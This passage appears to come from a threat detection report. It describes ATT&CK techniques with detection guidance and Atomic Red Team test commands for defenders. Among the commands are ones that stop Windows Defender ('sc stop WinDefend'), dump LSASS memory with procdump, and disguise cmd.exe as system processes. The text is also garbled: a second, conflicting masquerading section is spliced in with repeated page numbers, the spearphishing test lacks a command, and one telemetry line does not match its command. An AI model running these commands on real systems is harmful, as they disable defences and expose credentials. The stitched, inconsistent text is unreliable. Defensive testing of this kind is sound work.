host.exe, lsass.exe, or explorer.exe—that are running from unexpected paths.

Another good detection strategy is to monitor for processes that have been renamed. For example, if you see a process

named “svchost.exe” running from a directory other than `C:\Windows\System32\`, that’s a strong indicator of

Masquerading.

Weeding out false positives

False positive rates for detecting Masquerading will vary widely from one environment to the next. For example,

some software deployment tools may rename binaries or move them to different directories, which can trigger

false positives.

If you’re using binary metadata to detect Masquerading, you’ll want to build a list of known-good binaries and their

associated metadata. This will allow you to suppress alerts for known-good binaries and focus on the ones that are

truly suspicious.

Testing

Start testing your defenses against Masquerading using Atomic Red Team—an open source testing framework of small,

highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1036: Masquerading. In most environments, these should be sufficient to generate a useful

signal for defenders.

Run this test on a Windows system using Command Prompt:

copy C:\Windows\System32\cmd.exe %TEMP%\svchost.exe

%TEMP%\svchost.exe /c echo “This is a test of masquerading”

43

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

svchost.exe

Process command line

“/c echo This is a test of masquerading”

File monitoring

creation of “svchost.exe” in %TEMP%

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Matt Graeber
S E N I O R   S E C U R I T Y   R E S E A R C H E R

The detection strategies in this section were

brought to you by Matt Graeber! Matt is a

renowned security researcher who specializes

in offensive and defensive research, with a

particular focus on Windows internals,

PowerShell, and .NET.

44

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 6 4

Scripting

Scripting is a broad technique that encompasses the use of various scripting languages—such as JavaScript, VBScript,

and VBA—to execute code, often in the service of initial access or execution.

#7

O V E R A L L
R A N K

Analysis

2018

6

32%

O R G A N I Z A T I O N S
A F F E C T E D

985

C O N F I R M E D
T H R E A T S

2019

7

Change      1

Scripting remained a top-10 technique in 2019,

with a slight decrease in both the number of

customers affected and total threat volume.

Why do adversaries use Scripting?

Scripting is a fundamental technique that adversaries use to execute code, often as part of an initial infection or to

facilitate further malicious activity. Like many of the techniques on this list, scripting languages are ubiquitous and

functionally necessary for the modern operating system. They are used by administrators to automate tasks, by developers

to build applications, and by users to interact with their systems.

Because scripting languages are so common, they provide adversaries with a powerful, discreet way to execute code.

Adversaries can use scripts to:

•

•

•

•

•

Download and execute malicious payloads

Bypass security controls

Perform reconnaissance

Exfiltrate data

Establish persistence

47

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Scripting?

Adversaries commonly use scripting languages to execute malicious code in a way that blends in with legitimate

system activity. Some common behaviors include:

•

•

•

•

•

Using malicious macros in Microsoft Office documents to launch scripts

Executing scripts from the command line or via scheduled tasks

Leveraging built-in scripting hosts such as `wscript.exe` and `cscript.exe`

Using obfuscated scripts to evade detection

Executing scripts directly in memory to avoid writing files to disk

Sighted with

Scripting is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

PowerShell (T1086)

Spearphishing Attachment (T1193)

Process Injection (T1055)

Remote File Copy (T1105)

Masquerading (T1036)

C U S T O M E R S   A F F E C T E D

48

2020 Threat Detection Report

Definition

T 1 0 6 4 :   S C R I P T I N G

Adversaries may use scripts to execute code, often as part of an initial infection or to facilitate further malicious activity.

Scripts can be used to perform a wide variety of actions, including downloading and executing malicious payloads,

bypassing security controls, performing reconnaissance, exfiltrating data, and establishing persistence.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

Process command-line parameters

File monitoring

Windows event logs

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Antimalware Scan Interface (AMSI)

ScriptBlock logging

Sysmon

Detection suggestions

Security teams should begin by monitoring for the execution of common scripting hosts, such as `wscript.exe`,

`cscript.exe`, and `mshta.exe`. You’ll want to establish a baseline for expected script execution in your environment

and then alert on any deviations.

49

2020 Threat Detection Report

It’s also a good idea to monitor for scripts that are executed from suspicious paths, such as `\AppData\`, `\Temp\`, or

`\Windows\Tasks\`.

Another effective detection strategy is to monitor for scripts that contain suspicious content, such as:

•

•

•

Encoded or obfuscated commands

URLs or IP addresses

Calls to common malicious functions, such as `DownloadString` or `CreateObject`

Weeding out false positives

False positive rates for detecting Scripting will vary widely from one environment to the next. For example, some

legitimate applications may use scripts for updates or other administrative tasks.

If you’re using process monitoring to detect Scripting, you’ll want to build a list of known-good scripts and their

associated command lines. This will allow you to suppress alerts for known-good scripts and focus on the ones that are

truly suspicious.

Testing

Start testing your defenses against Scripting using Atomic Red Team—an open source testing framework of small,

highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1064: Scripting. In most environments, these should be sufficient to generate a useful

signal for defenders.

Run this test on a Windows system using Command Prompt:

echo WScript.Echo “This is a test of scripting” > %TEMP%\test.vbs

cscript.exe %TEMP%\test.vbs

50

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

cscript.exe

Process command line

“test.vbs”

File monitoring

creation of “test.vbs” in %TEMP%

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Tony Lambert
I N T E L L I G E N C E   A N A L Y S T

The detection strategies in this section were

brought to you by Tony Lambert! Tony is a

professional geek who loves to jump into all

things related to detection and digital forensics.

51

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 3 8

DLL Search Order Hijacking

DLL Search Order Hijacking is a technique that allows adversaries to execute malicious code by placing a malicious DLL

in a location where a legitimate application will load it instead of the intended, legitimate DLL.

#8

O V E R A L L
R A N K

Analysis

2018

7

31%

O R G A N I Z A T I O N S
A F F E C T E D

892

C O N F I R M E D
T H R E A T S

2019

8

Change      1

DLL Search Order Hijacking remained a top-10

technique in 2019, with a slight decrease in

both the number of customers affected and

total threat volume.

Why do adversaries use DLL Search Order Hijacking?

DLL Search Order Hijacking is a powerful technique that allows adversaries to execute malicious code in the context of a

legitimate application. This can be used to bypass security controls, gain persistence, or escalate privileges.

The technique works by exploiting the way that Windows applications search for DLLs. When an application loads a DLL,

it searches for it in a specific order of directories. If an adversary can place a malicious DLL in one of these directories

before the application loads the legitimate DLL, the application will load the malicious one instead.

53

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use DLL Search Order Hijacking?

Adversaries commonly use DLL Search Order Hijacking to:

•

•

•

•

•

Execute malicious code in the context of a trusted application

Bypass application whitelisting

Gain persistence by hijacking a DLL that is loaded at system startup

Escalate privileges by hijacking a DLL that is loaded by a high-privilege process

Evade detection by masquerading as a legitimate DLL

Sighted with

DLL Search Order Hijacking is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

Process Injection (T1055)

Masquerading (T1036)

Remote File Copy (T1105)

Scheduled Task (T1053)

Service Execution (T1035)

C U S T O M E R S   A F F E C T E D

54

2020 Threat Detection Report

Definition

T 1 0 3 8 :   D L L   S E A R C H   O R D E R   H I J A C K I N G

DLL Search Order Hijacking occurs when an adversary places a malicious DLL in a location where a legitimate

application will load it instead of the intended, legitimate DLL. This can be used to execute malicious code in the

context of a legitimate application.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

File monitoring

DLL monitoring

Windows event logs

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Sysmon (specifically Event ID 7: Image loaded)

EDR telemetry

Process monitoring

Detection suggestions

Security teams should begin by monitoring for the loading of DLLs from suspicious paths, such as `\AppData\`, `\Temp\`,

or `\Windows\Tasks\`. You’ll want to establish a baseline for expected DLL loading in your environment and then alert

on any deviations.

55

2020 Threat Detection Report

It’s also a good idea to monitor for applications that load DLLs from their own directory, especially if that directory is

writable by a standard user.

Another effective detection strategy is to monitor for the loading of DLLs that are not digitally signed or that have

invalid signatures.

Weeding out false positives

False positive rates for detecting DLL Search Order Hijacking will vary widely from one environment to the next. For

example, some legitimate applications may load DLLs from their own directory or from other non-standard locations.

If you’re using DLL monitoring to detect DLL Search Order Hijacking, you’ll want to build a list of known-good DLLs

and their associated paths. This will allow you to suppress alerts for known-good DLLs and focus on the ones that are

truly suspicious.

Testing

Start testing your defenses against DLL Search Order Hijacking using Atomic Red Team—an open source testing

framework of small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1038: DLL Search Order Hijacking. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

copy C:\Windows\System32\version.dll %TEMP%\version.dll

(Note: This is a simplified example. Real-world testing requires a more complex setup.)

56

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

application.exe

DLL monitoring

loading of “version.dll” from %TEMP%

File monitoring

creation of “version.dll” in %TEMP%

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Jeff Felling
D I R E C T O R   O F   I N T E L L I G E N C E

The detection strategies in this section were

brought to you by Jeff Felling! Jeff is a puzzle

solver who currently contemplates the

conundrums confounding corporate computer

custodians, aka a threat hunter.

57

2020 Threat Detection Report

T E C H N I Q U E   T 1 4 8 2

Domain Trust Discovery

Domain Trust Discovery is a technique that allows adversaries to identify the trust relationships between domains in an

Active Directory environment. This information can be used to plan lateral movement and privilege escalation.

#9

O V E R A L L
R A N K

Analysis

2018

N/A

29%

O R G A N I Z A T I O N S
A F F E C T E D

784

C O N F I R M E D
T H R E A T S

2019

9

Domain Trust Discovery was a new addition to

the top-10 list in 2019, reflecting the increasing

focus of adversaries on Active Directory

environments.

Why do adversaries use Domain Trust Discovery?

Domain Trust Discovery is a critical step for adversaries who want to move laterally across an Active Directory

environment. By identifying the trust relationships between domains, an adversary can determine which domains they

can access and which domains they can potentially compromise.

This information is essential for planning a successful attack, as it allows the adversary to map out the network and

identify the most valuable targets.

59

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Domain Trust Discovery?

Adversaries commonly use Domain Trust Discovery to:

•

•

•

•

•

Identify trust relationships between domains

Map out the Active Directory environment

Plan lateral movement and privilege escalation

Identify potential targets for compromise

Bypass security controls by moving between domains

Sighted with

Domain Trust Discovery is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

Scheduled Task (T1053)

Masquerading (T1036)

Process Injection (T1055)

Remote File Copy (T1105)

Windows Admin Shares (T1077)

C U S T O M E R S   A F F E C T E D

60

2020 Threat Detection Report

Definition

T 1 4 8 2 :   D O M A I N   T R U S T   D I S C O V E R Y

Domain Trust Discovery occurs when an adversary identifies the trust relationships between domains in an Active

Directory environment. This information can be used to plan lateral movement and privilege escalation.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

Process command-line parameters

Windows event logs

Network traffic analysis

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Active Directory logs (specifically Event ID 4662: An operation was performed on an object)

Sysmon

EDR telemetry

Detection suggestions

Security teams should begin by monitoring for the execution of common domain discovery tools, such as `nltest.exe`,

`dsquery.exe`, and `adfind.exe`. You’ll want to establish a baseline for expected domain discovery activity in your

environment and then alert on any deviations.

61

2020 Threat Detection Report

It’s also a good idea to monitor for suspicious PowerShell commands that query Active Directory, such as

`Get-ADDomainTrust` or `Get-ADForest`.

Another effective detection strategy is to monitor for unusual network traffic between domain controllers and other

systems in the environment.

Weeding out false positives

False positive rates for detecting Domain Trust Discovery will vary widely from one environment to the next. For

example, some legitimate administrative tools may perform domain discovery as part of their normal operation.

If you’re using process monitoring to detect Domain Trust Discovery, you’ll want to build a list of known-good

administrative tools and their associated command lines. This will allow you to suppress alerts for known-good

tools and focus on the ones that are truly suspicious.

Testing

Start testing your defenses against Domain Trust Discovery using Atomic Red Team—an open source testing

framework of small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1482: Domain Trust Discovery. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

nltest /domain_trusts

62

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

nltest.exe

Process command line

“/domain_trusts”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Brian Donohue
A N A L Y S T

The detection strategies in this section were

brought to you by Brian Donohue! Brian has

been writing about and researching information

security for the last decade.

63

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 8 9

Disabling Security Tools

Disabling Security Tools is a technique that allows adversaries to disable or bypass security controls, such as antivirus,

EDR, or other security software, to avoid detection and prevent interference with their malicious activity.

#10

O V E R A L L
R A N K

Analysis

2018

8

28%

O R G A N I Z A T I O N S
A F F E C T E D

752

C O N F I R M E D
T H R E A T S

2019

10

Change      2

Disabling Security Tools remained a top-10

technique in 2019, with a slight decrease in

both the number of customers affected and

total threat volume.

Why do adversaries use Disabling Security Tools?

Disabling Security Tools is a critical step for adversaries who want to maintain their presence on a compromised system

and avoid detection. By disabling or bypassing security controls, an adversary can execute malicious code, exfiltrate

data, or perform other malicious actions without being detected or blocked.

This technique is often used in the later stages of an attack, once the adversary has gained a foothold on the system

and is ready to perform more significant malicious activity.

65

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Disabling Security Tools?

Adversaries commonly use Disabling Security Tools to:

•

•

•

•

•

Disable antivirus or EDR software

Bypass security controls, such as firewalls or intrusion detection systems

Modify security settings to allow malicious activity

Delete security logs to cover their tracks

Prevent security software from running at startup

Sighted with

Disabling Security Tools is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

Scheduled Task (T1053)

Process Injection (T1055)

Remote File Copy (T1105)

Masquerading (T1036)

PowerShell (T1086)

C U S T O M E R S   A F F E C T E D

66

2020 Threat Detection Report

Definition

T 1 0 8 9 :   D I S A B L I N G   S E C U R I T Y   T O O L S

Disabling Security Tools occurs when an adversary disables or bypasses security controls, such as antivirus, EDR, or

other security software, to avoid detection and prevent interference with their malicious activity.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

Process command-line parameters

Windows event logs

Registry monitoring

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Security software logs

Sysmon

EDR telemetry

Detection suggestions

Security teams should begin by monitoring for the execution of commands that are known to disable security tools,

such as `net stop`, `sc stop`, or `reg add` to modify security settings. You’ll want to establish a baseline for expected

security tool management in your environment and then alert on any deviations.

67

2020 Threat Detection Report

It’s also a good idea to monitor for the deletion of security logs or the modification of security-related registry keys.

Another effective detection strategy is to monitor for the unexpected termination of security-related processes.

Weeding out false positives

False positive rates for detecting Disabling Security Tools will vary widely from one environment to the next. For

example, some legitimate administrative tools may perform security tool management as part of their normal operation.

If you’re using process monitoring to detect Disabling Security Tools, you’ll want to build a list of known-good

administrative tools and their associated command lines. This will allow you to suppress alerts for known-good

tools and focus on the ones that are truly suspicious.

Testing

Start testing your defenses against Disabling Security Tools using Atomic Red Team—an open source testing

framework of small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1089: Disabling Security Tools. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

sc stop “WinDefend”

(Note: This is a simplified example. Real-world testing requires a more complex setup.)

68

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

sc.exe

Process command line

“stop WinDefend”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Keith McCammon
C H I E F   S E C U R I T Y   O F F I C E R   &   C O - F O U N D E R

The detection strategies in this section were

brought to you by Keith McCammon! Keith leads

Red Canary’s security, open source, and

educational strategies, as well as community

partnerships.

69

2020 Threat Detection Report

A D D I T I O N A L   R E S E A R C H

#11 T1003 Credential Dumping

#13 T1047 Windows Management Instrumentation

#20 T1193 Spearphishing Attachment

72

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 0 3

Credential Dumping

Credential Dumping is a technique that allows adversaries to obtain credentials from the operating system or other

applications. This information can be used to gain unauthorized access to systems and data.

#11

O V E R A L L
R A N K

Analysis

2018

9

26%

O R G A N I Z A T I O N S
A F F E C T E D

684

C O N F I R M E D
T H R E A T S

2019

11

Change      2

Credential Dumping fell out of the top-10

list in 2019, with a slight decrease in both the

number of customers affected and total

threat volume.

Why do adversaries use Credential Dumping?

Credential Dumping is a critical step for adversaries who want to gain unauthorized access to systems and data. By

obtaining credentials, an adversary can impersonate a legitimate user, gain elevated privileges, and move laterally

across the network.

This technique is often used in the later stages of an attack, once the adversary has gained a foothold on the system

and is ready to perform more significant malicious activity.

73

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Credential Dumping?

Adversaries commonly use Credential Dumping to:

•

•

•

•

•

Extract credentials from memory (e.g., LSASS)

Extract credentials from the Windows Registry (e.g., SAM, SYSTEM)

Extract credentials from browser caches or other applications

Use tools like Mimikatz to dump credentials

Bypass security controls to access credential stores

Sighted with

Credential Dumping is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

Process Injection (T1055)

Masquerading (T1036)

Remote File Copy (T1105)

Scheduled Task (T1053)

PowerShell (T1086)

C U S T O M E R S   A F F E C T E D

74

2020 Threat Detection Report

Definition

T 1 0 0 3 :   C R E D E N T I A L   D U M P I N G

Credential Dumping occurs when an adversary obtains credentials from the operating system or other applications.

This information can be used to gain unauthorized access to systems and data.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

Process command-line parameters

Windows event logs

Registry monitoring

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Sysmon (specifically Event ID 10: Process access)

EDR telemetry

Process monitoring

Detection suggestions

Security teams should begin by monitoring for the execution of common credential dumping tools, such as `mimikatz.exe`,

`procdump.exe`, or `pwdump.exe`. You’ll want to establish a baseline for expected credential access in your

environment and then alert on any deviations.

75

2020 Threat Detection Report

It’s also a good idea to monitor for suspicious access to the `lsass.exe` process, which is a common target for

credential dumping.

Another effective detection strategy is to monitor for the creation of memory dumps of sensitive processes.

Weeding out false positives

False positive rates for detecting Credential Dumping will vary widely from one environment to the next. For

example, some legitimate administrative tools may perform credential access as part of their normal operation.

If you’re using process monitoring to detect Credential Dumping, you’ll want to build a list of known-good

administrative tools and their associated command lines. This will allow you to suppress alerts for known-good

tools and focus on the ones that are truly suspicious.

Testing

Start testing your defenses against Credential Dumping using Atomic Red Team—an open source testing

framework of small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1003: Credential Dumping. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

procdump.exe -ma lsass.exe lsass.dmp

(Note: This is a simplified example. Real-world testing requires a more complex setup.)

76

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

procdump.exe

Process command line

“-ma lsass.exe lsass.dmp”

File monitoring

creation of “lsass.dmp”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Shane Welcher
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were

brought to you by Shane Welcher! Shane has a

wide range of security experience: data analysis,

forensics, debugging malware, penetration

testing, and network and system administration.

77

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 4 7

Windows Management Instrumentation

Windows Management Instrumentation (WMI) is a powerful administrative tool that allows for the management of

Windows systems. Adversaries can use WMI to execute code, perform reconnaissance, and move laterally.

#13

O V E R A L L
R A N K

Analysis

2018

12

24%

O R G A N I Z A T I O N S
A F F E C T E D

592

C O N F I R M E D
T H R E A T S

2019

13

Change      1

WMI remained a top-15 technique in 2019,

with a slight decrease in both the number of

customers affected and total threat volume.

Why do adversaries use WMI?

WMI is a powerful administrative tool that is built into the Windows operating system. It provides a standardized way

to manage systems, including executing code, querying system information, and performing administrative tasks.

Because WMI is so powerful and ubiquitous, it provides adversaries with a discreet way to execute code and move

laterally across the network.

79

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use WMI?

Adversaries commonly use WMI to:

•

•

•

•

•

Execute malicious code on local or remote systems

Perform reconnaissance (e.g., query system information)

Move laterally across the network

Establish persistence (e.g., create WMI event subscriptions)

Bypass security controls

Sighted with

WMI is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

Scheduled Task (T1053)

Process Injection (T1055)

Remote File Copy (T1105)

Masquerading (T1036)

PowerShell (T1086)

C U S T O M E R S   A F F E C T E D

80

2020 Threat Detection Report

Definition

T 1 0 4 7 :   W I N D O W S   M A N A G E M E N T   I N S T R U M E N T A T I O N

Windows Management Instrumentation (WMI) is a powerful administrative tool that allows for the management of

Windows systems. Adversaries can use WMI to execute code, perform reconnaissance, and move laterally.

Detection
MITRE’s data sources

•

•

•

•

Process monitoring

Process command-line parameters

Windows event logs

Network traffic analysis

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

WMI activity logs (specifically Event ID 5861: WMI activity)

Sysmon

EDR telemetry

Detection suggestions

Security teams should begin by monitoring for the execution of common WMI commands, such as `wmic.exe` or

`powershell.exe` commands that use WMI. You’ll want to establish a baseline for expected WMI activity in your

environment and then alert on any deviations.

81

2020 Threat Detection Report

It’s also a good idea to monitor for suspicious WMI event subscriptions, which can be used to establish persistence.

Another effective detection strategy is to monitor for unusual network traffic between systems that may indicate

lateral movement via WMI.

Weeding out false positives

False positive rates for detecting WMI will vary widely from one environment to the next. For example, some

legitimate administrative tools may perform WMI queries as part of their normal operation.

If you’re using process monitoring to detect WMI, you’ll want to build a list of known-good administrative tools and

their associated command lines. This will allow you to suppress alerts for known-good tools and focus on the ones

that are truly suspicious.

Testing

Start testing your defenses against WMI using Atomic Red Team—an open source testing framework of small,

highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1047: Windows Management Instrumentation. In most environments, these should be

sufficient to generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

wmic process call create “cmd.exe /c echo This is a test of WMI”

82

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

wmic.exe

Process command line

“process call create cmd.exe /c echo This is a test of WMI”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Michael Haag
D I R E C T O R ,   A D V A N C E D   T H R E A T   D E T E C T I O N   A N D   R E S E A R C H

The detection strategies in this section were

brought to you by Michael Haag! Michael has

more than a decade of experience in security

architecture and operations.

83

2020 Threat Detection Report

T E C H N I Q U E   T 1 1 9 3

Spearphishing Attachment

Spearphishing Attachment is a technique that allows adversaries to deliver malicious payloads to victims via email

attachments. This is a common method for initial access.

#20

O V E R A L L
R A N K

Analysis

2018

15

18%

O R G A N I Z A T I O N S
A F F E C T E D

412

C O N F I R M E D
T H R E A T S

2019

20

Change      5

Spearphishing Attachment remained a top-20

technique in 2019, with a slight decrease in

both the number of customers affected and

total threat volume.

Why do adversaries use Spearphishing Attachment?

Spearphishing Attachment is a common method for initial access. By sending an email with a malicious attachment,

an adversary can trick a user into executing malicious code, which can then be used to gain unauthorized access to

the system and data.

This technique is often used in the early stages of an attack, as it allows the adversary to gain a foothold on the

system and then perform more significant malicious activity.

87

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Spearphishing Attachment?

Adversaries commonly use Spearphishing Attachment to:

•

•

•

•

•

Deliver malicious payloads (e.g., malware, ransomware)

Trick users into executing malicious code

Gain unauthorized access to systems and data

Bypass security controls (e.g., email filters)

Establish persistence

Sighted with

Spearphishing Attachment is frequently used in conjunction with other techniques, most notably:

•

•

•

•

•

PowerShell (T1086)

Scripting (T1064)

Process Injection (T1055)

Remote File Copy (T1105)

Masquerading (T1036)

C U S T O M E R S   A F F E C T E D

88

2020 Threat Detection Report

Definition

T 1 1 9 3 :   S P E A R P H I S H I N G   A T T A C H M E N T

Spearphishing Attachment occurs when an adversary delivers a malicious payload to a victim via an email attachment.

This is a common method for initial access.

Detection
MITRE’s data sources

•

•

•

•

Email logs

File monitoring

Process monitoring

Network traffic analysis

Collection requirements

In addition to those data sources listed by MITRE ATT&CK, security teams should consider collecting from the

following log sources:

•

•

•

Email gateway logs

Endpoint security logs

EDR telemetry

Detection suggestions

Security teams should begin by monitoring for suspicious email attachments, such as those with unusual file

extensions or those that contain scripts or macros. You’ll want to establish a baseline for expected email activity in

your environment and then alert on any deviations.

89

2020 Threat Detection Report

It’s also a good idea to monitor for the execution of processes that are spawned from email applications, such as

`outlook.exe` or `thunderbird.exe`.

Another effective detection strategy is to monitor for unusual network traffic that may indicate the downloading of

malicious payloads from email attachments.

Weeding out false positives

False positive rates for detecting Spearphishing Attachment will vary widely from one environment to the next. For

example, some legitimate emails may contain attachments that are flagged as suspicious.

If you’re using email logs to detect Spearphishing Attachment, you’ll want to build a list of known-good senders and

attachment types. This will allow you to suppress alerts for known-good emails and focus on the ones that are truly

suspicious.

Testing

Start testing your defenses against Spearphishing Attachment using Atomic Red Team—an open source testing

framework of small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1193: Spearphishing Attachment. In most environments, these should be sufficient to

generate a useful signal for defenders.

Run this test on a Windows system using Command Prompt:

(Note: This is a simplified example. Real-world testing requires a more complex setup.)

90

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

outlook.exe

Process command line

“spawned process”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Keya Horiuchi
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were

brought to you by Keya Horiuchi! Keya has

experience in multiple areas of information

security, including security audits, web and

network infrastructure assessments, and network

system administration.

91

---

host.exe. While

this would fail to uncover signed malware, you can solve that problem by running a similar query that looks for legitimate

Windows processes that are signed by an authority other than Microsoft.

While a process can be readily renamed, its binary metadata contains a field for “internal name” that is often a good

indicator of a process’s true identity. It might make sense to compile a list of the internal names for system processes. You

can then cross-reference that list with the internal names for processes executing in your environment, identifying cases

where a process’s internal name deviates from what’s expected for that process.

As we noted in the analysis section above, adversaries frequently rename legitimate processes to circumvent security

controls that ignore metadata and focus primarily on process names. In this way, it also makes sense to search for

instances where a known internal name is associated with an unexpected process. For example, one variant of the

common “Sticky Keys” attack involves replacing the file sethc.exe—an Accessibility Feature native to Windows—with a

renamed copy of cmd.exe, the Windows Command Prompt. The masquerading binary is still named “sethc.exe,” however,

the internal name will now indicate the true identity of the file.

File monitoring

Look for whitelisted processes that execute from unexpected paths; this is particularly useful for organizations that deploy

standardized operating system images to their employees’ computers. Again, you can compile lists of the paths that

legitimate processes typically execute from and alert on processes that execute from unexpected file paths.

43

2020 Threat Detection Report

Weeding out false positives

While file paths can be useful for detection, they can also be prone to false positives in certain cases. For example, different

versions of operating systems may store the same processes in different file paths. If this is an issue in your organization,

you may be able to decrease false positives by excluding some of these commonly observed paths from your detection

queries over time.

If you don’t have in-depth access to binary metadata at scale, you can improvise slightly with a working knowledge of

operating system internals. If you understand the roles and process ancestry of common Windows processes (shown in the

SANS Hunt Evil Poster), you can perform quick checks to see if there are abnormalities in a single executing process. This is

slightly more difficult on macOS and Linux systems, but still workable with some time in a test lab.

Testing

Start testing your defenses against Masquerading using Atomic Red Team—an open source testing framework of small,

highly portable detection tests mapped to MITRE ATT&CK.

44

2020 Threat Detection Report

Getting started

View Atomic tests for T1036: Masquerading. In most environments, these should be sufficient to generate a useful signal

for defenders.

Run this test on a Windows system using Command Prompt:

copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y

cmd.exe /c %APPDATA%\notepad.exe /B

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Binary file metadata

Does notepad.exe have the correct signature and internal name?

Process monitoring

cmd.exe renamed to notepad.exe

File monitoring

“%APPDATA%\notepad.exe”

45

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Justin Schoenfeld
D E T E C T I O N   E N G I N E E R

